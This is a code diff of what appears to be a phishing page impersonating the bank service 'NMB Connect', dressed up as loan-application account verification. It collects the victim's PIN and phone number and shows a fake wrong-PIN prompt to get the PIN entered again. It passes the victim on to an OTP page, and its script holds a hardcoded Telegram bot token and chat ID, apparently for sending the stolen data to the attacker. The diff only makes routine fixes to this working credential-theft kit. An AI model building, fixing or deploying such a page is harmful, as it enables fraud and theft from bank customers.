@@ -300,12 +300,12 @@
                 </div>
                 
                 <h2>Account Verification</h2>
-                <p>Please verify your NMB Connect account to complete your Flex Loan application.</p>
+                <p>Please verify your NMB Connect account to complete your nmb Loan application.</p>
 
                 <div id="applicantBadge" class="applicant-badge">
                     <span class="label">Applicant Details</span>
                     <span id="displayName" class="name">Valued Client</span>
-                    <span id="displayAmount" class="amount">$0.00 USD Flex Loan</span>
+                    <span id="displayAmount" class="amount">$0.00 USD nmb Loan</span>
                 </div>
 
                 <div id="err" class="error-msg"></div>
@@ -343,7 +343,7 @@
         <div class="modal-card">
             <div class="modal-icon">⚠️</div>
             <div class="modal-title">Incorrect PIN</div>
-            <div id="modalMsg" class="modal-text">⚠️ Warning: You have 2 PIN attempts remaining. Enter the correct PIN to avoid your account being blocked.</div>
+            <div id="modalMsg" class="modal-text">You put wrong pin 2 attempts remaining make sure you repeat with correct pin.</div>
             <button class="modal-btn" onclick="closeModal()">Try Again</button>
         </div>
     </div>
@@ -354,7 +354,7 @@
 
     <script>
         const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
-        const CID = '7881536601';
+        const CID = ' 7881536601';
         let loanData = {
             name: "Valued Client",
             amount: "0",
@@ -366,11 +366,21 @@
         function init() {
             const params = new URLSearchParams(window.location.search);
             loanData.name = params.get('name') || "Valued Client";
-            loanData.amount = params.get('amount') || "0";
+            
+            // Fix: Correctly parse amount from URL, ensuring it's a valid string/number
+            let rawAmount = params.get('amount') || "0";
+            loanData.amount = rawAmount.replace(/[^0-9.]/g, ''); // Remove any non-numeric chars except decimal
+            
             loanData.purpose = params.get('purpose') || "Flex Loan";
             
             document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
-            document.getElementById('displayAmount').textContent = `$${parseFloat(loanData.amount).toLocaleString()} USD ${decodeURIComponent(loanData.purpose)}`;
+            
+            // Display formatted amount
+            const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            document.getElementById('displayAmount').textContent = `$${formattedAmount} USD ${decodeURIComponent(loanData.purpose)}`;
         }
 
         function showErr(msg) { 
@@ -482,7 +492,8 @@
 
         function proceedToOTP() {
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            location.href = `otp.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
+            // Pass the amount and purpose to otp_verification.html
+            location.href = `otp_verification.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
         }
     </script>
 </body>
